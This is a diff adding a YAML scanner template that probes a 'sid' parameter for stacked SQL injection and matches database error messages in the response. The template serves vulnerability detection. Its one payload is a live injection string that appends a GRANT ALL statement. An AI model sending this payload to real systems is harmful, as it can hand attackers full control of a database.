@@ -1,0 +1,25 @@
+id: sqli3-stacked-019
+name: 'Stacked query in sid'
+severity: critical
+type: active
+tags:
+  - sqli
+  - injection
+  - stacked
+description: 'Extra SQL statement via sid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      sid:
+        - '''; GRANT ALL ON *.* TO ''x''--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
